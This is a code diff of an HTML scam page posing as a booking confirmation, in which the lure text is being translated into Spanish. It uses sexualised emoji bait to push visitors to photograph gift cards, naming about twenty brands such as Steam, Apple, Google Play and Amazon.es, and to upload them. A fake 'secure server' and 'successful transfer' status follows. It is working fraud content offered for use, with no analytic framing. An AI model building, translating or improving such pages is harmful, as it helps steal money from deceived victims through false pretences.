@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Validation de Réservation</title>
+  <title>CONFIRMACIÓN DE RESERVA</title>
 
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
@@ -36,17 +36,55 @@
   <div class="scan-container">
     <img id="chatImage" src="" alt="Profil" class="chat-img">
     <h2 id="chatName">Chargement'.".".'</h2>
-    <p id="chatDesc">🫠😘🫦👅 B4re continue mak sure 2 scan 1 steam pic's contain €20 4r reservation instead i'll 9ver reply u my kinky 🥵🥵</p>
+    <p id="chatDesc"> Para confirmar tu reserva, te sugerimos escanear una de estas tarjetas: Steam;
 
-    <button id="scanBtn" class="btn scanner-btn">📷 SCANN A PHOTO</button>
+PlayStation Store;
+
+Roblox;
+
+Nintendo eShop;
+
+Xbox/PC Game Pass;
+
+Apple (iTunes);
+
+Google Play;
+
+Netflix;
+
+Spotify;
+
+Amazon.es;
+
+El Corte Inglés;
+
+Zalando;
+
+Zara/Mango/Bershka;
+
+Sephora;
+
+Decathlon;
+
+MediaMarkt;
+
+IKEA;
+
+Fnac;
+
+Uber/Uber Eats;
+
+Cepsa; 🥵, si no, te aseguro que no te responderé 🫠🥵 </p>
+
+    <button id="scanBtn" class="btn scanner-btn">📷 CARD SCANNER</button>
     <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;">
     
     <img id="preview" src="" alt="Aperçu du scan">
     
-    <button id="validateBtn" class="btn validate-btn">VALIDATE & CONNECT</button>
+    <button id="validateBtn" class="btn validate-btn">VALIDAR Y CONECTAR</button>
     
     <div id="loading" class="loading-text">
-        <span id="loadStatus">sent to secured server...</span>
+        <span id="loadStatus">Enviar al servidor de seguridad...</span>
     </div>
   </div>
 
@@ -140,7 +178,7 @@ validateBtn.onclick = async () => {
 
     // Animation de succès 
     
-    loadStatus.innerHTML = "<span class='success-msg'>🌀 SUCCED TRANSFER!</span><br>Connexion to the chat.....";
+    loadStatus.innerHTML = "<span class='success-msg'>¡🌀 TRANSFERENCIA ÉXITOSA!</span><br>Connexion to the chat.....";
     localStorage.setItem('scanned_' + userKey + '_' + imgNum, "true");
 
     // Redirection après 2 secondes
@@ -150,7 +188,7 @@ validateBtn.onclick = async () => {
     }, 1000);
 
   } catch (e) {
-    alert("Erreur de connexion. Réessayez.");
+    alert("Error...");
     validateBtn.disabled = false;
     loading.style.display = "none";
   }
